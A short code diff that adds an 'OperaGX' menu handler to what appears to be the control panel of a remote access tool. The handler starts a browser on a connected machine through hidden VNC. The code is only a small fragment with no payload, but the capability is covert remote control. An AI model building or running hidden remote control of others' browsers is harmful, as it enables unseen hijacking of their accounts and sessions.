@@ -419,6 +419,14 @@ namespace Pulsar.Server.Forms
             });
         }
 
+        private void startOperaGXToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            _connectClient.Send(new StartHVNCProcess
+            {
+                Application = "OperaGX"
+            });
+        }
+
         private void startFirefoxToolStripMenuItem_Click(object sender, EventArgs e)
         {
             _connectClient.Send(new StartHVNCProcess
